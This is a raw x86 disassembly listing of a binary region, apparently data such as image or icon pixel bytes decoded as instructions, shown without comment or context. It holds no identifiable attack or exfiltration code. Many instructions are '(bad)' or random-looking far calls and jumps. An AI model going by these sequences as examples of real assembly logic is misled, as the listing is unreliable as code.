  412f7f:	ret    
  412f80:	add    BYTE PTR [eax],al
  412f82:	add    BYTE PTR [edx],ah
  412f84:	add    BYTE PTR [eax],al
  412f86:	add    BYTE PTR [edx],ah
  412f88:	or     eax,0x300d0d
  412f8d:	add    BYTE PTR [eax],al
  412f8f:	sub    DWORD PTR [eax],eax
  412f91:	add    BYTE PTR [eax],al
  412f93:	and    DWORD PTR [eax],eax
  412f95:	add    BYTE PTR [eax],al
  412f97:	sbb    BYTE PTR [eax],al
  412f99:	add    BYTE PTR [eax],al
  412f9b:	sldt   WORD PTR [eax]
  412f9e:	add    BYTE PTR [eax],cl
	...
  412fa8:	sub    ch,BYTE PTR [edx]
  412faa:	sub    DWORD PTR [ecx],ebp
  412fac:	outs   dx,DWORD PTR ds:[esi]
  412fad:	ins    DWORD PTR es:[edi],dx
  412fae:	outs   dx,DWORD PTR ds:[esi]
  412faf:	loop   0x412f44
  412fb1:	nop
  412fb2:	xchg   ecx,eax
  412fb3:	call   FWORD PTR [eax+0x59]
  412fb6:	pop    ecx
  412fb7:	lds    ecx,FWORD PTR ds:0x4a0e0e
  412fbd:	add    BYTE PTR [eax],al
  412fbf:	sbb    al,BYTE PTR [eax]
  412fc1:	add    BYTE PTR [eax],al
  412fc3:	and    eax,0x27000000
  412fc8:	add    BYTE PTR [eax],al
  412fca:	add    BYTE PTR [eax],bh
  412fcc:	add    al,BYTE PTR [edx]
  412fce:	add    DWORD PTR [edx],edi
  412fd0:	add    BYTE PTR [eax],al
  412fd2:	add    BYTE PTR [eax],cl
	...
  412fe4:	mov    eax,0x9e18b8b8
  412fe9:	sahf   
  412fea:	sahf   
  412feb:	(bad)  
  412fec:	retf   0xcaca
  412fef:	inc    esp
  412ff1:	(bad)  
  412ff2:	(bad)  
  412ff3:	(bad)  
  412ff4:	mov    eax,0xbaffb8b8
  412ff9:	mov    edx,0xbebeffba
  412ffe:	mov    esi,0xc0c0c0ff
  413003:	inc    ecx
  413005:	rol    ecx,0xff
  413008:	rol    ecx,0xc1
  41300b:	inc    eax
  41300d:	rol    al,0xff
  413010:	mov    eax,0xafffb8b8
  413015:	scas   eax,DWORD PTR es:[edi]
  413016:	scas   eax,DWORD PTR es:[edi]
  413017:	jmp    DWORD PTR [ebx-0x67005c5d]
  41301d:	cwde   
  41301e:	cwde   
  41301f:	inc    DWORD PTR [ebx+0x6dff8383]
  413025:	ins    DWORD PTR es:[edi],dx
  413026:	ins    DWORD PTR es:[edi],dx
  413027:	jmp    FWORD PTR [ecx+0x69]
  41302a:	imul   edi,edi,0xff81817f
  413030:	xchg   ebx,eax
  413031:	xchg   edx,eax
  413032:	xchg   edx,eax
  413033:	jmp    DWORD PTR [ebx-0x55005c5d]
  413039:	lods   al,BYTE PTR ds:[esi]
  41303a:	lods   al,BYTE PTR ds:[esi]
  41303b:	cld    
  41303c:	pop    esp
  41303d:	pop    esp
  41303e:	pop    esp
  41303f:	xchg   edx,eax
  413040:	dec    esi
  413041:	dec    esi
  413042:	dec    edi
  413043:	js     0x4130af
  413045:	push   0x6b
  413047:	xchg   esi,eax
  413048:	add    DWORD PTR [ebx+0x2f2f8084],0x2f
  41304f:	sub    DWORD PTR [eax],eax
  413051:	add    BYTE PTR [eax],al
  413053:	push   ss
  413054:	add    BYTE PTR [eax],al
  413056:	add    BYTE PTR [ecx],dl
  413058:	add    BYTE PTR [eax],al
  41305a:	add    BYTE PTR [ecx],cl
  41305c:	add    BYTE PTR [eax],al
  41305e:	add    BYTE PTR [eax+eax*1],al
  413061:	add    BYTE PTR [eax],al
  413063:	add    BYTE PTR [ebp+0x64],ah
  413066:	xor    ebx,DWORD PTR gs:[edi+0x5f]
  41306a:	pop    esi
  41306b:	jmp    0x41301f
  41306d:	mov    al,0xb0
  41306f:	call   FWORD PTR [esi-0x1c006666]
  413075:	loope  0x413058
  413077:	(bad)  
  413078:	fcomp  st(0)
  41307a:	fcos   
  41307c:	inc    esi
  41307d:	inc    esi
  41307e:	inc    esi
  41307f:	rol    DWORD PTR ds:0xe9a0505,cl
  413085:	push   cs
  413086:	push   cs
  413087:	mov    ebx,0xff636363
  41308c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41308d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41308e:	mov    ds:0x4a4c4bff,eax
  413093:	mov    ebp,0x55080b0a
  413098:	add    BYTE PTR [eax],al
  41309a:	add    BYTE PTR [ecx],dl
	...
  4130a8:	pop    edx
  4130a9:	pop    edx
  4130aa:	pop    edx
  4130ab:	(bad)  
  4130ad:	push   eax
  4130ae:	push   eax
  4130af:	and    BYTE PTR [esi-0x380d595a],0xc7
  4130b6:	(bad)  
  4130b7:	(bad)  
  4130b8:	mov    ecx,0xadffb9b9
  4130bd:	lods   eax,DWORD PTR ds:[esi]
  4130be:	lods   eax,DWORD PTR ds:[esi]
  4130bf:	jmp    DWORD PTR [ebp-0x5b005a5b]
  4130c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c7:	jmp    DWORD PTR [esp+eiz*4-0x6868005c]
  4130ce:	xchg   edi,eax
  4130cf:	dec    DWORD PTR [ecx+0x7dff8989]
  4130d5:	jge    0x413152
  4130d7:	push   DWORD PTR [ecx+0x71]
  4130da:	jno    0x4130db
  4130dc:	gs gs call FWORD PTR gs:[ebp+0x5e]
  4130e2:	pop    esi
  4130e3:	jmp    FWORD PTR [ecx+0x69]
  4130e6:	push   0xffffffff
  4130e8:	add    BYTE PTR [edx-0x6565007d],0x9b
  4130ef:	jmp    FWORD PTR [ebp-0x49005155]
  4130f5:	mov    dh,0xb5
  4130f7:	(bad)  
  4130f8:	mov    ecx,0xb8f8b7b7
  4130fd:	mov    dh,0xb6
  4130ff:	out    dx,al
  413100:	(bad)  
  413102:	(bad)  
  413104:	fcmovnu st,st(3)
  413106:	(bad)  
  413108:	lahf   
  413109:	lahf   
  41310a:	lahf   
  41310b:	clc    
  41310c:	jg     0x41318d
  41310e:	jle    0x41313c
  413110:	add    BYTE PTR [eax],al
  413112:	add    BYTE PTR [ebx],al
  413114:	add    BYTE PTR [eax],al
  413116:	add    BYTE PTR ds:0x3000000,al
  41311c:	add    BYTE PTR [eax],al
  41311e:	add    BYTE PTR [ecx],al
  413120:	add    BYTE PTR [eax],al
  413122:	add    BYTE PTR [eax],al
  413124:	cdq    
  413125:	cwde   
  413126:	fwait
  413127:	mov    dh,BYTE PTR [eax-0x57005354]
  41312d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41312e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41312f:	call   DWORD PTR [esi-0x54006e6f]
  413135:	stos   BYTE PTR es:[edi],al
  413136:	stos   DWORD PTR es:[edi],eax
  413137:	dec    edi
  413139:	iret   
  41313a:	sar    bh,1
  41313c:	ret    0xc2c2
  41313f:	call   FWORD PTR [eax-0x74006768]
  413145:	mov    ecx,DWORD PTR [ebx+0x5e5e5eff]
  41314b:	loop   0x4131ba
  41314d:	ins    DWORD PTR es:[edi],dx
  41314e:	ins    DWORD PTR es:[edi],dx
  41314f:	mov    bl,0xd1
  413151:	rcl    ecx,1
  413153:	stc    
  413154:	(bad)
  413157:	call   DWORD PTR [ebp+0x55]
  41315a:	push   esp
  41315b:	leave  
  41315c:	adc    dl,BYTE PTR [edx]
  41315e:	adc    BYTE PTR [edi+0x0],bl
  413161:	add    BYTE PTR [eax],al
  413163:	adc    eax,DWORD PTR [eax]
	...
  41316d:	add    BYTE PTR [eax],al
  41316f:	add    BYTE PTR [ebx+0x43],al
  413172:	inc    ebx
  413173:	cs dec esi
  413175:	dec    esi
  413176:	dec    ebp
  413177:	cdq    
  413178:	lea    ecx,[ebp-0x5e5e1972]
  41317e:	mov    eax,ds:0xa5a6a6ff
  413183:	call   FWORD PTR [edi-0x7a006161]
  413189:	test   DWORD PTR [ebp+0x777878ff],eax
  41318f:	(bad)  
  413190:	jp     0x41320c
  413192:	jns    0x413193
  413194:	jp     0x413211
  413196:	jl     0x413197
  413198:	jg     0x413219
  41319a:	cmp    edi,0xff8a8988
  4131a0:	popf   
  4131a1:	popf   
  4131a2:	lahf   
  4131a3:	jmp    FWORD PTR [ebx-0x50005255]
  4131a9:	scas   al,BYTE PTR es:[edi]
  4131aa:	scas   al,BYTE PTR es:[edi]
  4131ab:	push   DWORD PTR [ecx-0x49004f51]
  4131b1:	mov    bh,0xb7
  4131b3:	push   DWORD PTR [ebx-0x46004b4c]
  4131b9:	ret    
  4131ba:	vshufps ymm2,ymm0,ymm3,0xd4
  4131bf:	inc    edx
  4131c1:	ret    
  4131c2:	(bad)  
  4131c5:	mov    esi,0xa7a7febe
  4131ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131cb:	push   DWORD PTR [eax+0x70]
  4131ce:	jo     0x413219
	...
  4131e4:	nop
  4131e5:	(bad)  
  4131e6:	xchg   ecx,eax
  4131e7:	sub    DWORD PTR [edx-0x50005859],0xffffffaa
  4131ee:	stos   BYTE PTR es:[edi],al
  4131ef:	call   FWORD PTR [edi-0x4d006364]
  4131f5:	mov    al,0xb2
  4131f7:	dec    eax
  4131f9:	enter  0xffcc,0xab
  4131fd:	lods   al,BYTE PTR ds:[esi]
  4131fe:	lods   al,BYTE PTR ds:[esi]
  4131ff:	jmp    FWORD PTR [ebp-0x47005354]
  413205:	mov    eax,0x8484ffb8
  41320a:	test   cl,dh
  41320c:	cs cs cs mov ch,0x19
  413211:	sbb    DWORD PTR [ecx],ebx
  413213:	(bad)  
  413214:	jno    0x413288
  413216:	jae    0x4131cf
  413218:	rcl    dl,cl
  41321a:	shl    ah,cl
  41321c:	mov    bh,0xb7
  41321e:	mov    bh,0xff
  413220:	push   esi
  413221:	push   esi
  413222:	push   ebx
  413223:	mov    esi,0x6b181818
  413228:	add    BYTE PTR [eax],al
  41322a:	add    BYTE PTR [edi],ah
  41322c:	add    BYTE PTR [eax],al
  41322e:	add    BYTE PTR [esi],al
	...
  413238:	pop    ds
  413239:	and    BYTE PTR [eax],ah
  41323b:	or     BYTE PTR [ecx],bh
  41323d:	cmp    DWORD PTR [edx],edi
  41323f:	xor    al,0x79
  413241:	jns    0x4132be
  413243:	(bad)  
  413244:	xchg   esp,eax
  413245:	xchg   ebp,eax
  413246:	xchg   ebp,eax
  413247:	cli    
  413248:	test   DWORD PTR [ebp-0x75740077],eax
  41324e:	(bad)  
  41324f:	dec    DWORD PTR [esi-0x6e006d72]
  413255:	nop
  413256:	xchg   ebp,eax
  413257:	call   DWORD PTR [edi-0x5e006569]
  41325d:	mov    eax,ds:0xaaaaffa4
  413262:	lods   al,BYTE PTR ds:[esi]
  413263:	jmp    FWORD PTR [eax-0x50004f53]
  413269:	mov    ecx,0xc8b7ffbc
  41326e:	retf   
  41326f:	dec    eax
  413271:	fcomp  st(3)
  413273:	call   ecx
  413275:	fsubrp st(1),st
  413277:	(bad)  
  413278:	(bad)  
  41327a:	(bad)  
  41327b:	(bad)  
  41327c:	(bad)  
  41327e:	leave  
  41327f:	dec    ebx
  413281:	retf   0xfec8
  413284:	rol    ebp,0xc5
  413287:	cld    
  413288:	stos   BYTE PTR es:[edi],al
  413289:	test   al,0xa8
  41328b:	inc    DWORD PTR [esi+0x6d8686]
	...
  4132a1:	add    BYTE PTR [eax],al
  4132a3:	add    BYTE PTR [ecx-0x517c6d70],dl
  4132a9:	stos   BYTE PTR es:[edi],al
  4132aa:	stos   DWORD PTR es:[edi],eax
  4132ab:	push   DWORD PTR [ebp-0x58004e50]
  4132b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b3:	push   DWORD PTR [esi-0x3f00494c]
  4132b9:	mov    edi,0xb8b8ffc0
  4132be:	mov    eax,0xbababaff
  4132c3:	jmp    FWORD PTR [edi-0x32005051]
  4132c9:	int    0xcd
  4132cb:	(bad)  
  4132cc:	jmp    0xa9411cba
  4132d1:	test   al,0xa8
  4132d3:	cli    
  4132d4:	cmp    DWORD PTR [eax],edi
  4132d6:	cmp    BYTE PTR [ebx-0x69e1e3e4],dh
  4132dc:	add    DWORD PTR [ebx-0x90a257c],0xfffffff5
  4132e3:	jmp    DWORD PTR [ebx+0x19ffa2a2]
  4132e9:	pop    ss
  4132ea:	pop    ss
  4132eb:	test   DWORD PTR [edi],edx
  4132ed:	pop    ss
  4132ee:	sbb    BYTE PTR [esi],ah
  4132f0:	dec    eax
  4132f1:	dec    eax
  4132f2:	dec    edx
  4132f3:	inc    eax
  4132f4:	jae    0x413369
  4132f6:	ja     0x41336c
  4132f8:	add    DWORD PTR [ecx-0x77775a7a],0xffffff8c
  4132ff:	int3   
  413300:	mov    cl,BYTE PTR [ecx-0x75751373]
  413306:	mov    ?,edi
  413308:	mov    WORD PTR [edx+edx*4-0x6b707401],cs
  41330f:	dec    DWORD PTR [ebx-0x7300696f]
  413315:	xchg   esi,eax
  413316:	pushf  
  413317:	call   FWORD PTR [edx-0x4e005258]
  41331d:	mov    edi,0xd1c7ffc3
  413322:	aam    0xff
  413324:	rcl    ecx,1
  413326:	sar    bh,cl
  413328:	rol    ecx,cl
  41332a:	mov    esi,0xa4acdbff
  41332f:	call   ebp
  413331:	jg     0x4133a5
  413333:	dec    edx
  413335:	dec    eax
  413336:	xor    al,0xff
  413338:	rcl    BYTE PTR ds:0x19b4ff06,0x13
  41333f:	(bad)  
  413340:	mov    esp,0xc9ffa4a9
  413345:	(bad)  
  413347:	cld    
  413348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41334a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41334b:	call   FWORD PTR [edi+0x8d9f9f]
	...
  413361:	add    BYTE PTR [eax],al
  413363:	add    BYTE PTR [edx-0x497c6c70],dl
  413369:	mov    cl,0xb2
  41336b:	(bad)  
  41336c:	mov    ebp,0xb0ffb9b8
  413371:	stos   BYTE PTR es:[edi],al
  413372:	lods   eax,DWORD PTR ds:[esi]
  413373:	(bad)  
  413374:	mov    esi,0xbbffbdbc
  413379:	mov    ebx,0x8e8effbb
  41337e:	mov    ?,edi
  413380:	call   0xb5b5:0xb5ff9a9a
  413387:	push   DWORD PTR [ebp-0x3f004a4b]
  41338d:	rol    al,0xff
  413390:	jmp    0x41337d
  413392:	jmp    0x413393
  413394:	cmc    
  413395:	cmc    
  413396:	cmc    
  413397:	call   DWORD PTR [eax+0x55f69090]
  41339d:	push   ebp
  41339e:	push   esi
  41339f:	in     eax,dx
  4133a0:	pusha  
  4133a1:	popa   
  4133a2:	(bad)  
  4133a3:	hlt    
  4133a4:	jno    0x413416
  4133a6:	jae    0x41337d
  4133a8:	mov    DWORD PTR [edi-0x60602775],eax
  4133ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133af:	cmc    
  4133b0:	lahf   
  4133b1:	lahf   
  4133b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b3:	call   FWORD PTR [edx-0x6d005e63]
  4133b9:	xchg   edi,eax
  4133ba:	fwait
  4133bb:	call   DWORD PTR [eax-0x6e006269]
  4133c1:	popf   
  4133c2:	mov    eax,ds:0xaca796ff
  4133c7:	jmp    DWORD PTR [ebx-0x52004b50]
  4133cd:	scas   al,BYTE PTR es:[edi]
  4133ce:	scas   eax,DWORD PTR es:[edi]
  4133cf:	(bad)  
  4133d0:	mov    ecx,0xc6ffaba9
  4133d5:	mov    al,0xb0
  4133d7:	dec    eax
  4133d9:	mov    ds:0x87c8ff9e,eax
  4133de:	jle    0x4133df
  4133e0:	leave  
  4133e1:	bound  edx,QWORD PTR [ebx-0x1]
  4133e4:	mov    ebx,0xb4ff162a
  4133e9:	or     eax,DWORD PTR [eax]
  4133eb:	jmp    FWORD PTR [ebx-0x5b00fff8]
  4133f1:	or     DWORD PTR [eax],eax
  4133f3:	jmp    DWORD PTR [edx-0x5c00ffee]
  4133f9:	push   cs
  4133fa:	add    bh,bh
  4133fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133fd:	adc    al,0x1
  4133ff:	(bad)  
  413400:	mov    ebp,0xcdff9b9e
  413405:	fstp   st(7)
  413407:	(bad)  
  413408:	stos   BYTE PTR es:[edi],al
  413409:	test   eax,0x9999ffa9
  41340e:	cdq    
  41340f:	mov    cl,0x0
	...
  413421:	add    BYTE PTR [eax],al
  413423:	add    BYTE PTR [ecx-0x417c6c6e],dl
  413429:	mov    bh,0xb7
  41342b:	inc    ecx
  41342d:	mov    edx,0xaaaeffbd
  413432:	lods   al,BYTE PTR ds:[esi]
  413433:	(bad)  
  413434:	mov    esp,0xbcffbbba
  413439:	mov    esp,0x9f9fffbf
  41343e:	lahf   
  41343f:	call   FWORD PTR [eax-0x6f006768]
  413445:	nop
  413446:	nop
  413447:	call   FWORD PTR [eax-0x6b006668]
  41344d:	xchg   ebx,eax
  41344e:	xchg   ebp,eax
  41344f:	call   DWORD PTR [ecx-0x67006c6f]
  413455:	call   0xff9b:0x9698ff9a
  41345c:	pushf  
  41345d:	fwait
  41345e:	mov    eax,ds:0xaaa6a4ff
  413463:	jmp    DWORD PTR [ecx+ebp*4-0x50590053]
  41346a:	mov    dl,0xff
  41346c:	test   al,0xb2
  41346e:	mov    bh,0xff
  413470:	test   eax,0xaeffbcb6
  413475:	mov    ebp,0xb8afffc2
  41347a:	mov    edx,0xa8a7b3ff
  41347f:	inc    ecx
  413481:	mov    ds:0x90c4ffa0,al
  413486:	mov    ?,edi
  413488:	mov    ebx,0xb4ff6a6f
  41348d:	inc    esi
  41348e:	cmp    al,0xff
  413490:	test   eax,0xa1ff1625
  413495:	or     al,BYTE PTR [eax]
  413497:	jmp    DWORD PTR [ecx-0x5e00fffa]
  41349d:	push   es
  41349e:	add    bh,bh
  4134a0:	mov    ds:0xa6ff000e,al
  4134a5:	sbb    ecx,DWORD PTR [edx]
  4134a7:	jmp    FWORD PTR [eax-0x5300eddf]
  4134ad:	and    eax,0x28b1ff13
  4134b2:	adc    al,0xff
  4134b4:	mov    dl,0x29
  4134b6:	adc    eax,0x1024b3ff
  4134bb:	push   DWORD PTR [ebp-0x3e00f6e3]
  4134c1:	xchg   edi,eax
  4134c2:	xchg   ecx,eax
  4134c3:	dec    edi
  4134c5:	(bad)  
  4134c7:	(bad)  
  4134c8:	mov    cl,0xae
  4134ca:	scas   al,BYTE PTR es:[edi]
  4134cb:	call   FWORD PTR [edx+0xcc9b9b]
	...
  4134e1:	add    BYTE PTR [eax],al
  4134e3:	add    BYTE PTR [ebx-0x3b7a6b6f],dl
  4134e9:	mov    esi,0xbec6ffbf
  4134ee:	sar    edi,0xb0
  4134f1:	lods   al,BYTE PTR ds:[esi]
  4134f2:	stos   DWORD PTR es:[edi],eax
  4134f3:	(bad)  
  4134f4:	mov    ebp,0xbbffbbba
  4134f9:	mov    ebx,0x9d9dffbc
  4134fe:	popf   
  4134ff:	call   FWORD PTR [ebp-0x62006263]
  413505:	popf   
  413506:	lahf   
  413507:	dec    DWORD PTR [esi-0x6d006d72]
  41350d:	(bad)  
  41350e:	xchg   ebp,eax
  41350f:	dec    DWORD PTR [edx+0x7aff9392]
  413515:	mov    ds:0x9f92ff91,eax
  41351a:	mov    ds:0xb4afa2ff,eax
  41351f:	push   DWORD PTR [ebx-0x3f00373d]
  413525:	into   
  413526:	iret   
  413527:	inc    ecx
  413529:	ret    0xffc1
  41352c:	mov    ecx,0xbaffa0a2
  413531:	xchg   DWORD PTR [eax+0x6b6db3ff],eax
  413537:	jmp    DWORD PTR [edi-0x6100b5b4]
  41353d:	sub    al,0x24
  41353f:	call   FWORD PTR [eax-0x7400fff2]
  413545:	add    BYTE PTR [eax],al
  413547:	dec    DWORD PTR [ebx-0x70010000]
  41354d:	add    BYTE PTR [eax],al
  41354f:	call   DWORD PTR [ebx-0x6000fffb]
  413555:	sbb    ecx,DWORD PTR [edx]
  413557:	jmp    FWORD PTR [ebx-0x5100e3d5]
  41355d:	sub    al,0x1c
  41355f:	push   DWORD PTR [ecx-0x4c00e3d2]
  413565:	xor    BYTE PTR [ebx],bl
  413567:	push   DWORD PTR [ebp-0x4700e3d1]
  41356d:	xor    BYTE PTR ds:0x1f31baff,bl
  413573:	(bad)  
  413574:	mov    esp,0xbdff1f33
  413579:	xor    bl,BYTE PTR [edi]
  41357b:	(bad)  
  41357c:	mov    ebp,0xc3ff0c22
  413581:	mov    BYTE PTR [edi-0x1],bh
  413584:	into   
  413585:	fsubrp st(1),st
  413587:	push   DWORD PTR [ebp-0x65004b4b]
  41358d:	cdq    
  41358e:	cdq    
  41358f:	fld    QWORD PTR [eax]
	...
  4135a1:	add    BYTE PTR [eax],al
  4135a3:	add    BYTE PTR [ecx-0x35796a6e],dl
  4135a9:	ret    
  4135aa:	ret    
  4135ab:	dec    edx
  4135ad:	(bad)  
  4135ae:	(bad)  
  4135af:	push   DWORD PTR [ecx-0x42005354]
  4135b5:	mov    edx,0xbbbbffbb
  4135ba:	mov    esp,0x9d9d9dff
  4135bf:	call   FWORD PTR [edi-0x4d006061]
  4135c5:	mov    dl,0xb3
  4135c7:	call   DWORD PTR [esi-0x6a006569]
  4135cd:	cdq    
  4135ce:	popf   
  4135cf:	jmp    FWORD PTR [ebp+edi*4-0x3c4b0043]
  4135d6:	mov    edi,0xacabb5ff
  4135db:	jmp    FWORD PTR [ebp-0x57007c7a]
  4135e1:	pusha  
  4135e2:	pop    ebp
  4135e3:	jmp    DWORD PTR [edx-0x6900bab9]
  4135e9:	sub    eax,0x138dff2c
  4135ee:	push   cs
  4135ef:	inc    DWORD PTR [eax+eax*1+0x7aff00]
  4135f6:	add    bh,bh
  4135f8:	jl     0x4135fa
  4135fa:	add    bh,bh
  4135fc:	test   DWORD PTR [eax],eax
  4135fe:	add    bh,bh
  413600:	mov    al,BYTE PTR ds:0xf92ff00
  413606:	add    bh,bh
  413608:	xchg   edi,eax
  413609:	adc    BYTE PTR [eax],al
  41360b:	call   FWORD PTR [ecx+edx*1+0x12a2ff00]
  413612:	add    bh,bh
  413614:	scas   al,BYTE PTR es:[edi]
  413615:	sub    BYTE PTR [esi],dl
  413617:	push   DWORD PTR [esi-0x4900d9c9]
  41361d:	ss and eax,0x2638b8ff
  413623:	(bad)  
  413624:	mov    ebx,0xbfff2737
  413629:	cmp    esp,DWORD PTR [edi]
  41362b:	inc    edx
  41362d:	cmp    al,0x29
  41362f:	inc    esp
  413631:	ds sub bh,bh
  413634:	(bad)  
  413635:	aas    
  413636:	sub    edi,edi
  413638:	mov    DWORD PTR [edx+0x2c],0x142ec7ff
  41363f:	inc    edi
  413641:	js     0x4136b0
  413643:	dec    edi
  413645:	fstp   st(7)
  413647:	(bad)  
  413648:	mov    ecx,0x9affbbbb
  41364d:	cdq    
  41364e:	cdq    
  41364f:	jmp    0x0:0x0
	...
  413662:	add    BYTE PTR [eax],al
  413664:	xchg   edx,eax
  413665:	xchg   ecx,eax
  413666:	xchg   ebp,eax
  413667:	xchg   ah,cl
  413669:	mov    edi,0xc6c6ccff
  41366f:	push   DWORD PTR [ebx-0x44005152]
  413675:	mov    ebx,0xbcbcffbd
  41367a:	mov    ebp,0xa1a0a0ff
  41367f:	jmp    DWORD PTR [ecx-0x4c005e5f]
  413685:	mov    bl,0xb3
  413687:	jmp    DWORD PTR [eax+ebp*4-0x705d0054]
  41368e:	mov    ?,edi
  413690:	xchg   esi,eax
  413691:	cmp    DWORD PTR [eax],edi
  413693:	call   DWORD PTR [esi-0x7100d7db]
  413699:	sbb    dl,BYTE PTR [edi+edi*8]
  41369c:	mov    BYTE PTR [ebx],cl
  41369e:	add    bh,bh
  4136a0:	add    BYTE PTR [eax],0x0
  4136a3:	(bad)  
  4136a4:	jl     0x4136a6
  4136a6:	add    bh,bh
  4136a8:	jge    0x4136aa
  4136aa:	add    bh,bh
  4136ac:	jg     0x4136ae
  4136ae:	add    bh,bh
  4136b0:	add    DWORD PTR [edi],0xd87ff00
  4136b6:	add    bh,bh
  4136b8:	mov    cs,WORD PTR [edi]
  4136ba:	add    bh,bh
  4136bc:	nop
  4136bd:	(bad)  
  4136bf:	call   DWORD PTR [ebx+0x7eff010f]
  4136c5:	and    bl,BYTE PTR [eax]
  4136c7:	(bad)  
  4136c8:	jp     0x4136e2
  4136ca:	or     eax,0x119fff
  4136cf:	jmp    FWORD PTR [eax-0x4b00feec]
  4136d5:	xor    DWORD PTR [edi],ebx
  4136d7:	(bad)  
  4136d8:	mov    esp,0xbfff3242
  4136dd:	inc    edx
  4136de:	xor    edi,edi
  4136e0:	ret    
  4136e1:	inc    esp
  4136e2:	xor    edi,edi
  4136e4:	mov    BYTE PTR [esi+0x32],0xff
  4136e8:	enter  0x3448,0xff
  4136ec:	retf   
  4136ed:	dec    ecx
  4136ee:	xor    eax,0x364bcdff
  4136f3:	dec    edi
  4136f5:	dec    esp
  4136f6:	aaa    
  4136f7:	call   eax
  4136f9:	dec    edi
  4136fa:	cmp    bh,bh
  4136fc:	sar    DWORD PTR [ebx],1
  4136fe:	and    bh,bh
  413700:	retf   0x5e6c
  413703:	dec    ebp
  413705:	xlat   BYTE PTR ds:[ebx]
  413706:	fdivr  st,st(7)
  413708:	(bad)  
  413709:	enter  0xffc8,0x9b
  41370d:	call   0x0:0xf09a
	...
  413724:	xchg   ebx,eax
  413725:	nop
  413726:	xchg   esp,eax
  413727:	xchg   al,dl
  413729:	leave  
  41372a:	enter  0xcfff,0xc9
  41372e:	retf   0xb3ff
  413731:	mov    al,0xb1
  413733:	(bad)  
  413734:	mov    ebx,0xbfffbbb9
  413739:	mov    edi,0xa6a6ffbf
  41373e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41373f:	jmp    DWORD PTR [ebp-0x50005a5b]
  413745:	scas   eax,DWORD PTR es:[edi]
  413746:	scas   eax,DWORD PTR es:[edi]
  413747:	push   DWORD PTR [edx-0x62004448]
  41374d:	mov    DWORD PTR [edx+0x7cff],ecx
  413753:	inc    DWORD PTR [edx-0x7600ffff]
  413759:	push   cs
  41375a:	push   es
  41375b:	dec    DWORD PTR [ecx-0x7700f8ef]
  413761:	adc    cl,BYTE PTR [eax]
  413763:	inc    DWORD PTR [edi-0x7900f8ef]
  413769:	(bad)  
  41376b:	inc    DWORD PTR [ebp-0x7800fef5]
  413771:	or     al,0x0
  413773:	dec    DWORD PTR [ebp-0x6d00fff3]
  413779:	push   cs
  41377a:	add    bh,bh
  41377c:	xchg   esp,eax
  41377d:	(bad)  
  41377f:	(bad)  
  413780:	jg     0x4137b2
  413782:	daa    
  413783:	jmp    FWORD PTR [eax-0x5b00595a]
  413789:	mov    al,ds:0x1983ff9f
  41378e:	or     eax,0x518acff
  413793:	(bad)  
  413794:	mov    edi,0xc6ff3041
  413799:	push   edx
  41379a:	inc    ecx
  41379b:	dec    ecx
  41379d:	push   ecx
  41379e:	inc    eax
  41379f:	dec    ebp
  4137a1:	push   ebx
  4137a2:	aas    
  4137a3:	call   eax
  4137a5:	push   ebp
  4137a6:	inc    eax
  4137a7:	call   edx
  4137a9:	push   edi
  4137aa:	inc    ebx
  4137ab:	call   esp
  4137ad:	pop    eax
  4137ae:	inc    esp
  4137af:	call   esi
  4137b1:	pop    edx
  4137b2:	inc    ebp
  4137b3:	(bad)  
  4137b4:	fcomp  DWORD PTR [ebx+0x46]
  4137b7:	(bad)  
  4137b8:	fstp   DWORD PTR [esi+0x49]
  4137bb:	(bad)  
  4137bc:	fmul   QWORD PTR [esi+0x35]
  4137bf:	call   ebx
  4137c1:	arpl   WORD PTR [eax-0x1],dx
  4137c4:	int    0xcd
  4137c6:	int3   
  4137c7:	dec    esp
  4137c9:	rcl    ebx,cl
  4137cb:	call   FWORD PTR [esp+ebx*4-0x67680b64]
  4137d2:	cwde   
  4137d3:	adc    eax,DWORD PTR [eax]
	...
  4137e1:	add    BYTE PTR [eax],al
  4137e3:	add    BYTE PTR [ebx-0x2f796c70],dl
  4137e9:	leave  
  4137ea:	retf   0xceff
  4137ed:	enter  0xffc9,0xb3
  4137f1:	scas   eax,DWORD PTR es:[edi]
  4137f2:	mov    al,0xff
  4137f4:	mov    ebx,0xbfffbab9
  4137f9:	mov    edi,0xa9a9ffc1
  4137fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ff:	jmp    FWORD PTR [ecx-0x53005657]
  413805:	lods   al,BYTE PTR ds:[esi]
  413806:	lods   al,BYTE PTR ds:[esi]
  413807:	(bad)  
  413808:	mov    edx,0xa4ffbdbc
  41380d:	mov    ds:0xe82ffa5,al
  413812:	add    eax,0x121b90ff
  413817:	call   DWORD PTR [edx-0x7100e2db]
  41381d:	push   ds
  41381e:	adc    eax,0x121b8cff
  413823:	dec    DWORD PTR [ebx-0x7600f1e9]
  413829:	adc    al,0xc
  41382b:	dec    DWORD PTR [ecx-0x7200f9ee]
  413831:	or     eax,0xd91ff00
  413836:	add    bh,bh
  413838:	xchg   ebp,eax
  413839:	(bad)  
  41383b:	(bad)  
  41383c:	jnp    0x413863
  41383e:	sbb    al,0xff
  413840:	mov    bl,0xaa
  413842:	test   eax,0xb6b6b6ff
  413847:	(bad)  
  413848:	mov    esi,0x89ffbebe
  41384d:	fs popa 
  41384f:	jmp    DWORD PTR [ebx-0x3700f5e3]
  413855:	push   eax
  413856:	ds dec esi
  413859:	pusha  
  41385a:	dec    esi
  41385b:	call   ecx
  41385d:	pop    esi
  41385e:	dec    esp
  41385f:	call   ebp
  413861:	pusha  
  413862:	dec    ebp
  413863:	call   edi
